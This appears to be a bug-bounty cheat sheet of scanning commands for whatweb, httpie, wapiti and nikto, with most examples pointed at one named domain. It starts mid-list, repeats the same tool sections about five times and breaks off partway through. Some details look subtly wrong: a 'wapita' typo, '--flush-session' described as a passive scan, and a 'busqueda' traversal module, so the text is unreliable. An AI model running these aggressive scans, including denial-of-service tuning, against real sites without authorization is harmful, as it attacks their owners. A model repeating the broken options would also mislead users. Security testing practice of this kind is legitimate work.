- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

